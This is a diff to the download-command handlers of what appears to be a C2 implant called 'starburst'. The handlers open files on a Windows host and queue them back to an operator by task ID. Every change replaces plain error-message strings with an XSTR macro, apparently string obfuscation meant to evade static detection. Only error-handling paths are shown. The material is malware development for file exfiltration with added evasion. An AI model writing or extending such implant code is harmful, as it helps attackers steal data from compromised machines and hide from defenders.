@@ -20,7 +20,7 @@ auto declfn starburst::cmd_download(
     auto path = parser_string( params, &path_len );
     if ( !path || path_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no file path" ) ) );
+            XSTR( "no file path" ) );
         return;
     }
 
@@ -38,7 +38,7 @@ auto declfn starburst::cmd_download(
 
     if ( h_file == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateFileW failed" ) ) );
+            XSTR( "CreateFileW failed" ) );
         return;
     }
 
@@ -46,7 +46,7 @@ auto declfn starburst::cmd_download(
     if ( !inst.kernel32.GetFileSizeEx( h_file, &file_size ) ) {
         inst.kernel32.CloseHandle( h_file );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetFileSizeEx failed" ) ) );
+            XSTR( "GetFileSizeEx failed" ) );
         return;
     }
 
@@ -66,7 +66,7 @@ auto declfn starburst::cmd_download(
     if ( slot < 0 ) {
         inst.kernel32.CloseHandle( h_file );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "too many pending downloads" ) ) );
+            XSTR( "too many pending downloads" ) );
         return;
     }
 
@@ -223,7 +223,7 @@ auto declfn starburst::cmd_download_resp(
             inst.kernel32.CloseHandle( dl.h_file );
             dl.active = false;
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
 
